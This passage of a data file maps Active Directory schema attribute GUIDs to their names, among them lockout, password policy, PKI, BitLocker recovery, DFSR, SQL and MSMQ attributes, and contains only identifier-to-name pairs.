	"b7c69e60-2cc7-11d2-854e-00a0c983f608": "Inter-Site-Topology-Failover",
	"bf96798c-0de6-11d0-a285-00aa003049e2": "Instance-Type",
	"96a7dd64-9118-11d1-aebc-0000f80367c1": "Install-Ui-Level",
	"f0f8ff90-1191-11d0-a060-00aa006c33ed": "Initials",
	"52458024-ca6a-11d0-afff-0000f80367c1": "Initial-Auth-Outgoing",
	"52458023-ca6a-11d0-afff-0000f80367c1": "Initial-Auth-Incoming",
	"7bfdcb87-4807-11d1-a9c3-0000f80367c1": "IndexedScopes",
	"7d6c0e92-7e20-11d0-afd6-00c04fd930c9": "Implemented-Categories",
	"b8c8c35e-4a19-4a95-99d0-69fe4446286f": "ms-DS-Lockout-Threshold",
	"421f889a-472e-4fe4-8eb9-e1d0bc6071b2": "ms-DS-Lockout-Duration",
	"b05bda89-76af-468a-b892-1be55558ecc8": "ms-DS-Lockout-Observation-Window",
	"4ad6016b-b0d2-4c9b-93b6-5964b17b968c": "ms-DS-Local-Effective-Recycle-Time",
	"94f2800c-531f-4aeb-975d-48ac39fd8ca4": "ms-DS-Local-Effective-Deletion-Time",
	"75ccdd8f-af6c-4487-bb4b-69e4d38a959c": "ms-DS-Password-Reversible-Encryption-Enabled",
	"db68054b-c9c3-4bf0-b15b-0fb52552a610": "ms-DS-Password-Complexity-Enabled",
	"fed81bb7-768c-4c2f-9641-2245de34794d": "ms-DS-Password-History-Length",
	"1a3d0d20-5844-4199-ad25-0f5039a76ada": "ms-DS-OIDToGroup-Link-BL",
	"f9c9a57c-3941-438d-bebf-0edaf2aca187": "ms-DS-OIDToGroup-Link",
	"b21b3439-4c3a-441c-bb5f-08f20e9b315e": "ms-DS-Minimum-Password-Length",
	"2a74f878-4d9c-49f9-97b3-6767d1cbd9a3": "ms-DS-Minimum-Password-Age",
	"fdd337f5-4999-4fce-b252-8ff9c9b43875": "ms-DS-Maximum-Password-Age",
	"60234769-4819-4615-a1b2-49d2f119acb5": "ms-DS-Mastered-By",
	"ad7940f8-e43a-4a42-83bc-d688e59ea605": "ms-DS-Logon-Time-Sync-Interval",
	"c523e9c0-33b5-4ac8-8923-b57b927f42f6": "ms-DS-KeyVersionNumber",
	"8ab15858-683e-466d-877f-d640e1f9a611": "ms-DS-Last-Known-RDN",
	"a8e8aa23-3e67-4af1-9d7a-2f1a1d633ac9": "ms-DS-isRODC",
	"1df5cf33-0fe5-499e-90e1-e94b42718a46": "ms-DS-isGC",
	"6fabdcda-8c53-204f-b1a4-9df0c67c1eb4": "ms-DS-Is-Possible-Values-Present",
	"bc60096a-1b47-4b30-8877-602c93f56532": "ms-DS-IntId",
	"7bc64cea-c04e-4318-b102-3e0729371a65": "ms-DS-Integer",
	"79abe4eb-88f3-48e7-89d6-f4bc7e98c331": "ms-DS-Host-Service-Account-BL",
	"80641043-15a2-40e1-92a2-8ca866f70776": "ms-DS-Host-Service-Account",
	"ae2de0e2-59d7-4d47-8d47-ed4dfe4357ad": "ms-DS-Has-Master-NCs",
	"6f17e347-a842-4498-b8b3-15e007da4fed": "ms-DS-Has-Domain-NCs",
	"11e9a5bc-4517-4049-af9c-51554fb0fc09": "ms-DS-Has-Instantiated-NCs",
	"fb00dcdf-ac37-483a-9c12-ac53a6603033": "ms-DS-Filter-Containers",
	"9b88bda8-dd82-4998-a91d-5f2d2baf1927": "ms-DS-Optional-Feature-GUID",
	"604877cd-9cdb-47c7-b03d-3daadb044910": "ms-DS-External-Store",
	"b92fd528-38ac-40d4-818d-0433380837c1": "ms-DS-External-Key",
	"9d054a5a-d187-46c1-9d85-42dfc44a56dd": "ms-DS-ExecuteScriptPassword",
	"e1e9bad7-c6dd-4101-a843-794cec85b038": "ms-DS-Entry-Time-To-Die",
	"ce5b01bc-17c6-44b8-9dc1-a9668b00901b": "ms-DS-Enabled-Feature-BL",
	"5706aeaf-b940-4fb2-bcfc-5268683ad9fe": "ms-DS-Enabled-Feature",
	"2143acca-eead-4d29-b591-85fa49ce9173": "ms-DS-DnsRootAlias",
	"a9b38cb6-189a-4def-8a70-0fcfa158148e": "ms-DS-Deleted-Object-Lifetime",
	"6818f726-674b-441b-8a3a-f40596374cea": "ms-DS-Default-Quota",
	"234fcbd8-fb52-4908-a328-fd9f6e58e403": "ms-DS-Date-Time",
	"c5e60132-1480-11d3-91c1-0000f87a57d4": "MS-DS-Creator-SID",
	"178b7bc2-b63a-11d2-90e1-00c04fd91ab1": "MS-DS-Consistency-Child-Count",
	"23773dc2-b63a-11d2-90e1-00c04fd91ab1": "MS-DS-Consistency-Guid",
	"3566bf1f-beee-4dcb-8abe-ef89fcfec6c1": "ms-DS-Cached-Membership-Time-Stamp",
	"69cab008-cdd4-4bc9-bab8-0ff37efe1b20": "ms-DS-Cached-Membership",
	"f0d8972e-dd5b-40e5-a51d-044c7c17ece7": "ms-DS-Byte-Array",
	"d31a8757-2447-4545-8081-3bb610cacbf2": "ms-DS-Behavior-Version",
	"b5f7e349-7a5b-407c-a334-a31c3f538b98": "ms-DS-Az-Generic-Data",
	"8491e548-6c38-4365-a732-af041569b02c": "ms-DS-Az-Object-Guid",
	"7b078544-6c82-4fe9-872f-ff48ad2b2e26": "ms-DS-Az-Task-Is-Role-Definition",
	"87d0fb41-2c8b-41f6-b972-11fdfd50d6b0": "ms-DS-Az-Script-Timeout",
	"2629f66a-1f95-4bf3-a296-8e9d7b9e30c8": "ms-DS-Az-Script-Engine-Cache-Max",
	"515a6b06-2617-4173-8099-d5605df043c6": "ms-DS-Az-Scope-Name",
	"a5f3b553-5d76-4cbe-ba3f-4312152cab18": "ms-DS-Az-Operation-ID",
	"ee85ed93-b209-4788-8165-e702f51bfbf3": "ms-DS-Az-Minor-Version",
	"cfb9adb7-c4b7-4059-9568-1ed9db6b7248": "ms-DS-Az-Major-Version",
	"5e53368b-fc94-45c8-9d7d-daf31ee7112d": "ms-DS-Az-LDAP-Query",
	"665acb5c-bb92-4dbc-8c59-b3638eab09b3": "ms-DS-Az-Last-Imported-Biz-Rule-Path",
	"f90abab0-186c-4418-bb85-88447c87222a": "ms-DS-Az-Generate-Audits",
	"6448f56a-ca70-4e2e-b0af-d20e4ce653d0": "ms-DS-Az-Domain-Timeout",
	"013a7277-5c2d-49ef-a7de-b765b36a3f6f": "ms-DS-Az-Class-ID",
	"52994b56-0e6c-4e07-aa5c-ef9d7f5a0e25": "ms-DS-Az-Biz-Rule-Language",
	"33d41ea8-c0c9-4c92-9494-f104878413fd": "ms-DS-Az-Biz-Rule",
	"7184a120-3ac4-47ae-848f-fe0ab20784d4": "ms-DS-Az-Application-Version",
	"db5b0728-6208-4876-83b7-95d3e5695275": "ms-DS-Az-Application-Name",
	"503fc3e8-1cc6-461a-99a3-9eee04f402a7": "ms-DS-Az-Application-Data",
	"e8b2c971-a6df-47bc-8d6f-62770d527aa5": "ms-DS-AuthenticatedTo-Accountlist",
	"3e1ee99c-6604-4489-89d9-84798a89515a": "ms-DS-AuthenticatedAt-DC",
	"e185d243-f6ce-4adb-b496-b0c005d7823c": "ms-DS-Approx-Immed-Subordinates",
	"c4af1073-ee50-4be0-b8c0-89a41fe99abe": "ms-DS-Auxiliary-Classes",
	"800d94d7-b7a1-42a1-b14d-7cae1423d07f": "ms-DS-Allowed-To-Delegate-To",
	"8469441b-9ac4-4e45-8205-bd219dbf672d": "ms-DS-Allowed-DNS-Suffixes",
	"d3aa4a5c-4e03-4810-97aa-2b339e7a434b": "MS-DS-All-Users-Trust-Quota",
	"975571df-a4d5-429a-9f59-cdc6581d91e6": "ms-DS-Additional-Sam-Account-Name",
	"80863791-dbe9-4eb8-837e-7f0ab55d9ac7": "ms-DS-Additional-Dns-Host-Name",
	"e85e1204-3434-41ad-9b56-e2901228fff0": "MS-DRM-Identity-Certificate",
	"8e940c8a-e477-4367-b08d-ff2ff942dcd7": "ms-COM-UserPartitionSetLink",
	"9e6f3a4d-242c-4f37-b068-36b57f9fc852": "ms-COM-UserLink",
	"67f121dc-7d02-4c7d-82f5-9ad4c950ac34": "ms-COM-PartitionSetLink",
	"09abac62-043f-4702-ac2b-6ca15eee5754": "ms-COM-PartitionLink",
	"430f678b-889f-41f2-9843-203b5a65572f": "ms-COM-ObjectId",
	"998b10f7-aa1a-4364-b867-753d197fe670": "ms-COM-DefaultPartitionLink",
	"1f2ac2c8-3b71-11d2-90cc-00c04fd91ab1": "Move-Tree-State",
	"bf9679c8-0de6-11d0-a285-00aa003049e2": "Moniker-Display-Name",
	"bf9679c7-0de6-11d0-a285-00aa003049e2": "Moniker",
	"9a7ad94a-ca53-11d1-bbd0-0080c76670c0": "Modify-Time-Stamp",
	"bf9679c6-0de6-11d0-a285-00aa003049e2": "Modified-Count-At-Last-Prom",
	"bf9679c5-0de6-11d0-a285-00aa003049e2": "Modified-Count",
	"bf9679c4-0de6-11d0-a285-00aa003049e2": "Min-Ticket-Age",
	"bf9679c3-0de6-11d0-a285-00aa003049e2": "Min-Pwd-Length",
	"bf9679c2-0de6-11d0-a285-00aa003049e2": "Min-Pwd-Age",
	"0296c122-40da-11d1-a9c0-0000f80367c1": "MHS-OR-Address",
	"bf9679c0-0de6-11d0-a285-00aa003049e2": "Member",
	"11b6cc8c-48c4-11d1-a9c3-0000f80367c1": "meetingURL",
	"11b6cc82-48c4-11d1-a9c3-0000f80367c1": "meetingType",
	"11b6cc90-48c4-11d1-a9c3-0000f80367c1": "meetingStartTime",
	"11b6cc8a-48c4-11d1-a9c3-0000f80367c1": "meetingScope",
	"11b6cc8f-48c4-11d1-a9c3-0000f80367c1": "meetingRecurrence",
	"11b6cc8d-48c4-11d1-a9c3-0000f80367c1": "meetingRating",
	"11b6cc81-48c4-11d1-a9c3-0000f80367c1": "meetingProtocol",
	"11b6cc88-48c4-11d1-a9c3-0000f80367c1": "meetingOwner",
	"1a861408-38c3-49ea-ba75-85481a77c655": "ms-DFSR-Version",
	"92aa27e0-5c50-402d-9ec1-ee847def9788": "ms-FRS-Topology-Pref",
	"5643ff81-35b6-4ca9-9512-baf0bd0a2772": "ms-FRS-Hub-Member",
	"bf9679f4-0de6-11d0-a285-00aa003049e2": "ms-Exch-Owner-BL",
	"16775820-47f3-11d1-a9c3-0000f80367c1": "ms-Exch-LabeledURI",
	"a8df7407-c5ea-11d1-bbcb-0080c76670c0": "ms-Exch-House-Identifier",
	"a8df7394-c5ea-11d1-bbcb-0080c76670c0": "ms-Exch-Assistant-Name",
	"523fc6c8-9af4-4a02-9cd7-3dea129eeb27": "ms-DS-Token-Group-Names-No-GC-Acceptable",
	"fa06d1f4-7922-4aad-b79c-b2201f54417c": "ms-DS-Token-Group-Names-Global-And-Universal",
	"65650576-4699-4fc9-8d18-26e0cd0137a6": "ms-DS-Token-Group-Names",
	"8a0560c1-97b9-4811-9db7-dc061598965b": "ms-DS-Optional-Feature-Flags",
	"ab5543ad-23a1-3b45-b937-9b313d5474a8": "ms-DS-Value-Type-Reference-BL",
	"78fc5d84-c1dc-3148-8984-58f792d41d3e": "ms-DS-Value-Type-Reference",
	"31f7b8b6-c9f8-4f2d-a37b-58a823030331": "ms-DS-USN-Last-Sync-Success",
	"c5d234e5-644a-4403-a665-e26e0aef5e98": "ms-DS-Failed-Interactive-Logon-Count-At-Last-Successful-Logon",
	"dc3ca86f-70ad-4960-8425-a4d6313d93dd": "ms-DS-Failed-Interactive-Logon-Count",
	"c7e7dafa-10c3-4b8b-9acd-54f11063742e": "ms-DS-Last-Failed-Interactive-Logon-Time",
	"011929e6-8b5d-4258-b64a-00b0b4949747": "ms-DS-Last-Successful-Interactive-Logon-Time",
	"aa1c88fd-b0f6-429f-b2ca-9d902266e808": "ms-DS-Revealed-List-BL",
	"cbdad11c-7fec-387b-6219-3a0627d9af81": "ms-DS-Revealed-List",
	"fe01245a-341f-4556-951f-48c033a89050": "ms-DS-Is-User-Cachable-At-Rodc",
	"37c94ff6-c6d4-498f-b2f9-c6f7f8647809": "ms-DS-Is-Partial-Replica-For",
	"ff155a2a-44e5-4de0-8318-13a58988de4f": "ms-DS-Is-Domain-For",
	"c8bc72e0-a6b4-48f0-94a5-fd76a88c9987": "ms-DS-Is-Full-Replica-For",
	"5dd68c41-bfdf-438b-9b5d-39d9618bf260": "ms-DS-KrbTgt-Link-BL",
	"94f6f2ac-c76d-4b5e-b71f-f332c3e93c22": "ms-DS-Revealed-DSAs",
	"aa156612-2396-467e-ad6a-28d23fdb1865": "ms-DS-Secondary-KrbTgt-Number",
	"303d9f4a-1dd6-4b38-8fc5-33afe8c988ad": "ms-DS-Reveal-OnDemand-Group",
	"15585999-fd49-4d66-b25d-eeb96aba8174": "ms-DS-Never-Reveal-Group",
	"1d3c2d18-42d0-4868-99fe-0eca1e6fa9f3": "ms-DS-Has-Full-Replica-NCs",
	"185c7821-3749-443a-bd6a-288899071adb": "ms-DS-Revealed-Users",
	"778ff5c9-6f4e-4b74-856a-d68383313910": "ms-DS-KrbTgt-Link",
	"773e93af-d3b4-48d4-b3f9-06457602d3d0": "ms-DS-Source-Object-DN",
	"146eb639-bb9f-4fc1-a825-e29e00c77920": "ms-DS-UpdateScript",
	"add5cf10-7b09-4449-9ae6-2534148f8a72": "ms-DS-User-Password-Expiry-Time-Computed",
	"2cc4b836-b63f-4940-8d23-ea7acf06af56": "ms-DS-User-Account-Control-Computed",
	"df446e52-b5fa-4ca2-a42f-13f98a526c8f": "ms-DS-Tasks-For-Az-Task-BL",
	"b11c8ee2-5fcd-46a7-95f0-f38333f096cf": "ms-DS-Tasks-For-Az-Task",
	"a0dcd536-5158-42fe-8c40-c00a7ad37959": "ms-DS-Tasks-For-Az-Role-BL",
	"35319082-8c4a-4646-9386-c2949d49894d": "ms-DS-Tasks-For-Az-Role",
	"789ee1eb-8c8e-4e4c-8cec-79b31b7617b5": "ms-DS-SPN-Suffixes",
	"c17c5602-bcb7-46f0-9656-6370ca884b72": "ms-DS-Site-Affinity",
	"0e1b47d7-40a3-4b48-8d1b-4cac0c1cdf21": "ms-DS-Settings",
	"4f146ae8-a4fe-4801-a731-f51848a4f4e4": "ms-DS-Security-Group-Extra-Classes",
	"4c51e316-f628-43a5-b06b-ffb695fcb4f3": "ms-DS-SD-Reference-Domain",
	"b39a61be-ed07-4cab-9a4a-4963ed0141e1": "ms-ds-Schema-Extensions",
	"d5b35506-19d6-4d26-9afb-11357ac99b5e": "ms-DS-Retired-Repl-NC-Signatures",
	"08e3aa79-eb1c-45b5-af7b-8f94246c8e41": "ms-DS-ReplicationEpoch",
	"d63db385-dd92-4b52-b1d8-0d3ecc0e86b6": "ms-DS-Replication-Notify-Subsequent-DSA-Delay",
	"85abd4f4-0a89-4e49-bdec-6f35bb2562ba": "ms-DS-Replication-Notify-First-DSA-Delay",
	"0ea12b84-08b3-11d3-91bc-0000f87a57d4": "MS-DS-Replicates-NC-Reason",
	"2f5c8145-e1bd-410b-8957-8bfa81d5acfd": "ms-DS-Repl-Value-Meta-Data",
	"d7c53242-724e-4c39-9d4c-2df8c9d66c7a": "ms-DS-Repl-Attribute-Meta-Data",
	"d921b50a-0ab2-42cd-87f6-09cf83a91854": "ms-DS-Preferred-GC-Site",
	"8b70a6c6-50f9-4fa3-a71e-1ce03040449b": "MS-DS-Per-User-Trust-Tombstones-Quota",
	"d161adf0-ca24-4993-a3aa-8b2c981302e8": "MS-DS-Per-User-Trust-Quota",
	"2de144fc-1f52-486f-bdf4-16fcc3084e54": "ms-DS-Non-Security-Group-Extra-Classes",
	"f547511c-5b2a-44cc-8358-992a88258164": "ms-DS-NC-RO-Replica-Locations-BL",
	"3df793df-9858-4417-a701-735a1ecebf74": "ms-DS-NC-RO-Replica-Locations",
	"97de9615-b537-46bc-ac0f-10720f3909f3": "ms-DS-NC-Replica-Locations",
	"855f2ef5-a1c5-4cc4-ba6d-32522848b61f": "ms-DS-NC-Repl-Outbound-Neighbors",
	"9edba85a-3e9e-431b-9b1a-a5b6e9eda796": "ms-DS-NC-Repl-Inbound-Neighbors",
	"8a167ce4-f9e8-47eb-8d78-f7fe80abb2cc": "ms-DS-NC-Repl-Cursors",
	"b5a84308-615d-4bb7-b05f-2f1746aa439f": "ms-DS-Quota-Used",
	"16378906-4ea5-49be-a8d1-bfd41dff4f65": "ms-DS-Quota-Trustee",
	"6655b152-101c-48b4-b347-e1fcebc60157": "ms-DS-Quota-Effective",
	"fbb9a00d-3a8c-4233-9cf9-7189264903a1": "ms-DS-Quota-Amount",
	"564e9325-d057-c143-9e3b-4f9e5ef46f93": "ms-DS-Principal-Name",
	"79d2f34c-9d7d-42bb-838f-866b3e4400e2": "ms-DS-Other-Settings",
	"a637d211-5739-4ed1-89b2-88974548bc59": "ms-DS-Operations-For-Az-Task-BL",
	"1aacb436-2e9d-44a9-9298-ce4debeb6ebf": "ms-DS-Operations-For-Az-Task",
	"f85b6228-3734-4525-b6b7-3f3bb220902c": "ms-DS-Operations-For-Az-Role-BL",
	"93f701be-fa4c-43b6-bc2f-4dbea718ffab": "ms-DS-Operations-For-Az-Role",
	"2b702515-c1f7-4b3b-b148-c0e4c6ceecb4": "ms-DS-Object-Reference-BL",
	"638ec2e8-22e7-409c-85d2-11b21bee72de": "ms-DS-Object-Reference",
	"d064fb68-1480-11d3-91c1-0000f87a57d4": "MS-DS-Machine-Account-Quota",
	"7b7cce4f-f1f5-4bb6-b7eb-23504af19e75": "ms-DS-Top-Quota-Usage",
	"461744d7-f3b6-45ba-8753-fb9552a5df32": "ms-DS-Tombstone-Quota-Factor",
	"29cc866e-49d3-4969-942e-1dbc0925d183": "ms-DS-Trust-Forest-Trust-Info",
	"20119867-1d04-4ab7-9371-cfc3d5df0afd": "ms-DS-Supported-Encryption-Types",
	"98a7f36d-3595-448a-9e6f-6b8965baed9c": "ms-DS-SiteName",
	"c881b4e2-43c0-4ebe-b9bb-5250aa9b434c": "ms-DS-Promotion-Settings",
	"def449f1-fd3b-4045-98cf-d9658da788b5": "ms-DS-HAB-Seniority-Index",
	"e21a94e4-2d66-4ce5-b30d-0ef87a776ff0": "ms-DS-Phonetic-Display-Name",
	"5bd5208d-e5f4-46ae-a514-543bc9c47659": "ms-DS-Phonetic-Company-Name",
	"6cd53daf-003e-49e7-a702-6fa896e7a6ef": "ms-DS-Phonetic-Department",
	"f217e4ec-0836-4b90-88af-2f5d4bbda2bc": "ms-DS-Phonetic-Last-Name",
	"4b1cba4e-302f-4134-ac7c-f01f6c797843": "ms-DS-Phonetic-First-Name",
	"2a8c68fc-3a7a-4e87-8720-fe77c51cbe74": "ms-DS-Non-Members-BL",
	"cafcb1de-f23c-46b5-adf7-1e64957bd5db": "ms-DS-Non-Members",
	"5a2eacd7-cc2b-48cf-9d9a-b6f1a0024de9": "ms-DS-NC-Type",
	"ececcd20-a7e0-4688-9ccf-02ece5e287f5": "ms-DS-Members-For-Az-Role-BL",
	"cbf7e6cd-85a4-4314-8939-8bfe80597835": "ms-DS-Members-For-Az-Role",
	"d1e169a4-ebe9-49bf-8fcb-8aef3874592d": "ms-DS-Max-Values",
	"456374ac-1f0a-4617-93cf-bc55a7c9d341": "ms-DS-Password-Settings-Precedence",
	"b77ea093-88d0-4780-9a98-911f8e8b1dca": "ms-DS-Resultant-PSO",
	"4beca2e8-a653-41b2-8fee-721575474bec": "ms-DS-Required-Forest-Behavior-Version",
	"eadd3dfe-ae0e-4cc2-b9b9-5fe5b6ed2dd2": "ms-DS-Required-Domain-Behavior-Version",
	"5e6cf031-bda8-43c8-aca4-8fee4127005b": "ms-DS-PSO-Applied",
	"64c80f48-cdd2-4881-a86d-4e97b6f561fc": "ms-DS-PSO-Applies-To",
	"94c56394-ccee-11d2-9993-0000f87a57d4": "MS-SQL-Vines",
	"8fda89f4-ccee-11d2-9993-0000f87a57d4": "MS-SQL-AppleTalk",
	"8ac263a6-ccee-11d2-9993-0000f87a57d4": "MS-SQL-TCPIP",
	"86b08004-ccee-11d2-9993-0000f87a57d4": "MS-SQL-SPX",
	"8157fa38-ccee-11d2-9993-0000f87a57d4": "MS-SQL-MultiProtocol",
	"7b91c840-ccee-11d2-9993-0000f87a57d4": "MS-SQL-NamedPipe",
	"7778bd90-ccee-11d2-9993-0000f87a57d4": "MS-SQL-Clustered",
	"72dc918a-ccee-11d2-9993-0000f87a57d4": "MS-SQL-UnicodeSortOrder",
	"6ddc42c0-ccee-11d2-9993-0000f87a57d4": "MS-SQL-SortOrder",
	"696177a6-ccee-11d2-9993-0000f87a57d4": "MS-SQL-CharacterSet",
	"64933a3e-ccee-11d2-9993-0000f87a57d4": "MS-SQL-ServiceAccount",
	"603e94c4-ccee-11d2-9993-0000f87a57d4": "MS-SQL-Build",
	"5b5d448c-ccee-11d2-9993-0000f87a57d4": "MS-SQL-Memory",
	"561c9644-ccee-11d2-9993-0000f87a57d4": "MS-SQL-Location",
	"4f6cbdd8-ccee-11d2-9993-0000f87a57d4": "MS-SQL-Contact",
	"48fd44ea-ccee-11d2-9993-0000f87a57d4": "MS-SQL-RegisteredOwner",
	"3532dfd8-ccee-11d2-9993-0000f87a57d4": "MS-SQL-Name",
	"9666bb5c-df9d-4d41-b437-2eec7e27c9b3": "ms-RADIUS-SavedFramedIpv6Route",
	"5a5aa804-3083-4863-94e5-018a79a22ec0": "ms-RADIUS-FramedIpv6Route",
	"0965a062-b1e1-403b-b48d-5c0eb0e952cc": "ms-RADIUS-SavedFramedIpv6Prefix",
	"f63ed610-d67c-494d-87be-cd1e24359a38": "ms-RADIUS-FramedIpv6Prefix",
	"a4da7289-92a3-42e5-b6b6-dad16d280ac9": "ms-RADIUS-SavedFramedInterfaceId",
	"a6f24a23-d65c-4d65-a64f-35fb6873c2b9": "ms-RADIUS-FramedInterfaceId",
	"f39b98ac-938d-11d1-aebd-0000f80367c1": "ms-RRAS-Vendor-Attribute-Entry",
	"f39b98ad-938d-11d1-aebd-0000f80367c1": "ms-RRAS-Attribute",
	"b8dfa744-31dc-4ef1-ac7c-84baf7ef9da7": "ms-PKI-AccountCredentials",
	"b3f93023-9239-4f7c-b99c-6745d87adbc2": "ms-PKI-DPAPIMasterKeys",
	"6617e4ac-a2f1-43ab-b60c-11fbd1facf05": "ms-PKI-RoamingTimeStamp",
	"fe17e04b-937d-4f7e-8e0e-9292c8d5683e": "ms-PKI-RA-Signature",
	"d546ae22-0951-4d47-817e-1c9f96faad46": "ms-PKI-RA-Policies",
	"3c91fbbf-4773-4ccd-a87b-85d53e7bcf6a": "ms-PKI-RA-Application-Policies",
	"0c15e9f5-491d-4594-918f-32813a091da9": "ms-PKI-Template-Schema-Version",
	"13f5236c-1884-46b1-b5d0-484e38990d58": "ms-PKI-Template-Minor-Revision",
	"9de8ae7d-7a5b-421d-b5e4-061f79dfd5d7": "ms-PKI-Supersede-Templates",
	"0cd8711f-0afc-4926-a4b1-09b08d3d436c": "ms-PKI-Site-Name",
	"bab04ac2-0435-4709-9307-28380e7c7001": "ms-PKI-Private-Key-Flag",
	"04c4da7a-e114-4e69-88de-e293f2d3b395": "ms-PKI-OID-User-Notice",
	"7d59a816-bb05-4a72-971f-5c1331f67559": "ms-PKI-OID-LocalizedName",
	"5f49940e-a79f-4a51-bb6f-3d446a54dc6b": "ms-PKI-OID-CPS",
	"8c9e1288-5028-4f4f-a704-76d026f246ef": "ms-PKI-OID-Attribute",
	"e96a63f5-417f-46d3-be52-db7703c503df": "ms-PKI-Minimal-Key-Size",
	"f22bd38f-a1d0-4832-8b28-0331438886a6": "ms-PKI-Enrollment-Servers",
	"d15ef7d8-f226-46db-ae79-b34e560bd12c": "ms-PKI-Enrollment-Flag",
	"b7ff5a38-0818-42b0-8110-d3d154c97f24": "ms-PKI-Credential-Roaming-Tokens",
	"38942346-cc5b-424b-a7d8-6ffd12029c5f": "ms-PKI-Certificate-Policy",
	"ea1dddc4-60ff-416e-8cc0-17cee534bce7": "ms-PKI-Certificate-Name-Flag",
	"dbd90548-aa37-4202-9966-8c537ba5ce32": "ms-PKI-Certificate-Application-Policy",
	"3164c36a-ba26-468c-8bda-c1e5cc256728": "ms-PKI-Cert-Template-OID",
	"d3c527c7-2606-4deb-8cfd-18426feec8ce": "ms-net-ieee-8023-GP-PolicyReserved",
	"8398948b-7457-4d91-bd4d-8d7ed669c9f7": "ms-net-ieee-8023-GP-PolicyData",
	"94a7b05a-b8b2-4f59-9c25-39e69baa1684": "ms-net-ieee-8023-GP-PolicyGUID",
	"0f69c62e-088e-4ff5-a53a-e923cec07c0a": "ms-net-ieee-80211-GP-PolicyReserved",
	"9c1495a5-4d76-468e-991e-1433b0a67855": "ms-net-ieee-80211-GP-PolicyData",
	"35697062-1eaf-448b-ac1e-388e0be4fdee": "ms-net-ieee-80211-GP-PolicyGUID",
	"7b6760ae-d6ed-44a6-b6be-9de62c09ec67": "ms-Imaging-PSP-String",
	"51583ce9-94fa-4b12-b990-304c35b18595": "ms-Imaging-PSP-Identifier",
	"2a7827a4-1483-49a5-9d84-52e3812156b4": "ms-IIS-FTP-Root",
	"8a5c99e9-2230-46eb-b8e8-e59d712eb9ee": "ms-IIS-FTP-Dir",
	"7f73ef75-14c9-4c23-81de-dd07a06f9e8b": "ms-ieee-80211-ID",
	"6558b180-35da-4efe-beed-521f8f48cafb": "ms-ieee-80211-Data-Type",
	"0e0d0938-2658-4580-a9f6-7a0ac7b566cb": "ms-ieee-80211-Data",
	"aa4e1a6d-550d-4e05-8c35-4afcb917a9fe": "ms-TPM-OwnerInformation",
	"f76909bc-e678-47a0-b0b3-f86a0044c06d": "ms-FVE-RecoveryGuid",
	"1fd55ea8-88a7-47dc-8129-0daa97186a54": "ms-FVE-KeyPackage",
	"85e5a5cf-dcee-4075-9cfd-ac9db6a2f245": "ms-FVE-VolumeGuid",
	"43061ac1-c8ad-4ccc-b785-2bfac20fc60a": "ms-FVE-RecoveryPassword",
	"2ab0e48d-ac4e-4afc-83e5-a34240db6198": "ms-DFSR-MaxAgeInCacheInMin",
	"4c5d607a-ce49-444a-9862-82a95f5d1fcc": "ms-DFSR-MinDurationCacheInMin",
	"db7a08e7-fc76-4569-a45f-f5ecb66a88b5": "ms-DFSR-CachePolicy",
	"5ac48021-e447-46e7-9d23-92c0c6a90dfb": "ms-DFSR-ReadOnly",
	"53ed9ad1-9975-41f4-83f5-0c061a12553a": "ms-DFSR-DeletedSizeInMb",
	"817cf0b8-db95-4914-b833-5a079ef65764": "ms-DFSR-DeletedPath",
	"eb20e7d6-32ad-42de-b141-16ad2631b01b": "ms-DFSR-Priority",
	"5eb526d7-d71b-44ae-8cc6-95460052e6ac": "ms-DFSR-ComputerReferenceBL",
	"adde62c6-1880-41ed-bd3c-30b7d25e14f0": "ms-DFSR-MemberReferenceBL",
	"6c7b5785-3d21-41bf-8a8a-627941544d5a": "ms-DFSR-ComputerReference",
	"261337aa-f1c3-44b2-bbea-c88d49e6f0c7": "ms-DFSR-MemberReference",
	"f7b85ba9-3bf9-428f-aab4-2eee6d56f063": "ms-DFSR-DfsLinkTarget",
	"2dad8796-7619-4ff8-966e-0a5cc67b287f": "ms-DFSR-ReplicationGroupGuid",
	"51928e94-2cd8-4abe-b552-e50412444370": "ms-DFSR-RootFence",
	"2cc903e2-398c-443b-ac86-ff6b01eac7ba": "ms-DFSR-DfsPath",
	"f402a330-ace5-4dc1-8cc9-74d900bf8ae0": "ms-DFSR-RdcMinFileSizeInKb",
	"e3b44e05-f4a7-4078-a730-f48670a743f8": "ms-DFSR-RdcEnabled",
	"1035a8e1-67a8-4c21-b7bb-031cdf99d7a0": "ms-DFSR-ContentSetGuid",
	"d6d67084-c720-417d-8647-b696237a114c": "ms-DFSR-Options",
	"fe515695-3f61-45c8-9bfa-19c148c57b09": "ms-DFSR-Flags",
	"048b4692-6227-4b67-a074-c4437083e14b": "ms-DFSR-Keywords",
	"4699f15f-a71f-48e2-9ff5-5897c0759205": "ms-DFSR-Schedule",
	"93c7b477-1f2e-4b40-b7bf-007e8d038ccf": "ms-DFSR-DirectoryFilter",
	"d68270ac-a5dc-4841-a6ac-cd68be38c181": "ms-DFSR-FileFilter",
	"23e35d4c-e324-4861-a22f-e199140dae00": "ms-DFSR-TombstoneExpiryInMin",
	"eeed0fc8-1001-45ed-80cc-bbf744930720": "ms-DFSR-ReplicationGroupType",
	"03726ae7-8e7d-4446-8aae-a91657c00993": "ms-DFSR-Enabled",
	"9ad33fc9-aacf-4299-bb3e-d1fc6ea88e49": "ms-DFSR-ConflictSizeInMb",
	"5cf0bcc8-60f7-4bff-bda6-aea0344eb151": "ms-DFSR-ConflictPath",
	"250a8f20-f6fc-4559-ae65-e4b24c67aebe": "ms-DFSR-StagingSizeInMb",
	"86b9a69e-f0a6-405d-99bb-77d977992c2a": "ms-DFSR-StagingPath",
	"90b769ac-4413-43cf-ad7a-867142e740a3": "ms-DFSR-RootSizeInMb",
	"d7d5e8c1-e61f-464f-9fcf-20bbe0a2ec54": "ms-DFSR-RootPath",
	"78f011ec-a766-4b19-adcf-7b81ed781a4d": "ms-DFSR-Extension",
	"1d2f4412-f10d-4337-9b48-6e5b125cd265": "MSMQ-Multicast-Address",
	"9a0dc33f-c100-11d1-bbc5-0080c76670c0": "MSMQ-Migrated",
	"9a0dc335-c100-11d1-bbc5-0080c76670c0": "MSMQ-Long-Lived",
	"4580ad25-d407-48d2-ad24-43e6e56793d7": "MSMQ-Label-Ex",
	"9a0dc325-c100-11d1-bbc5-0080c76670c0": "MSMQ-Label",
	"9a0dc324-c100-11d1-bbc5-0080c76670c0": "MSMQ-Journal-Quota",
	"9a0dc321-c100-11d1-bbc5-0080c76670c0": "MSMQ-Journal",
	"99b88f52-3b7b-11d2-90cc-00c04fd91ab1": "MSMQ-Interval2",
	"8ea825aa-3b7b-11d2-90cc-00c04fd91ab1": "MSMQ-Interval1",
